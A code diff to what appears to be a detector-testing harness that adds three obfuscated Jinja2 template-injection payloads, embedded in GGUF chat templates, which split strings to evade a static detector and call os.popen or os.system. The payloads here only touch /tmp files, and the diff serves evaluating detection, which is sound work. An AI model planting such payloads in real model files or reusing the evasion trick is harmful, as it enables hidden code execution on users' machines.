@@ -199,6 +199,8 @@ def generate_candidate_gguf(attack: str, trigger_path: str | None = None) -> byt
     """
     if attack == "ssti_chat_template":
         return benign_gguf(chat_template=_ssti_payload(trigger_path or "/tmp/trig.txt"))
+    if attack in SSTI_OBFUSCATED_VARIANTS:
+        return benign_gguf(chat_template=SSTI_OBFUSCATED_VARIANTS[attack])
 
     # The malformed families reproduce the vellaveto attack *technique*
     # (sentinel counts, overflow length prefixes, version 0, traversal names,
@@ -241,6 +243,9 @@ GGUF_ATTACKS: tuple[str, ...] = (
     "path_traversal",
     "negative_dims",
     "version_zero",
+    "ssti_obfuscated_1",
+    "ssti_obfuscated_2",
+    "ssti_obfuscated_3",
 )
 
 GGUF_ATTACK_LABELS: dict[str, str] = {
@@ -251,4 +256,19 @@ GGUF_ATTACK_LABELS: dict[str, str] = {
     "path_traversal": "gguf_malformed_path_traversal",
     "negative_dims": "gguf_malformed_negative_dims",
     "version_zero": "gguf_malformed_version_zero",
+    "ssti_obfuscated_1": "gguf_ssti_obfuscated_1",
+    "ssti_obfuscated_2": "gguf_ssti_obfuscated_2",
+    "ssti_obfuscated_3": "gguf_ssti_obfuscated_3",
+}
+
+# Obfuscated Jinja2 SSTI variants that avoid every literal SSTI_SIGNALS
+# substring (ggufref's static detector) while still executing on the
+# llama-cpp-python render path. Execution is confirmed by the strace-based
+# GGUF oracle (containers/gguf/loader.py --strace-mode), decoupling
+# confirmation from static detection. `attr` + string-split is a real
+# Jinja2/Flask RCE evasion technique, not a synthetic artifact.
+SSTI_OBFUSCATED_VARIANTS: dict[str, str] = {
+    "ssti_obfuscated_1": '{{ lipsum|attr("__glob"+"als__")["os"]["po"+"pen"]("touch /tmp/t_v1") }}',
+    "ssti_obfuscated_2": '{{ cycler.__init__|attr("__glob"+"als__")["os"]["sy"+"stem"]("touch /tmp/t_v2") }}',
+    "ssti_obfuscated_3": '{{ lipsum|attr("__glob"+"als__")["os"]["sy"+"stem"]("touch /tmp/t_v3") }}',
 }
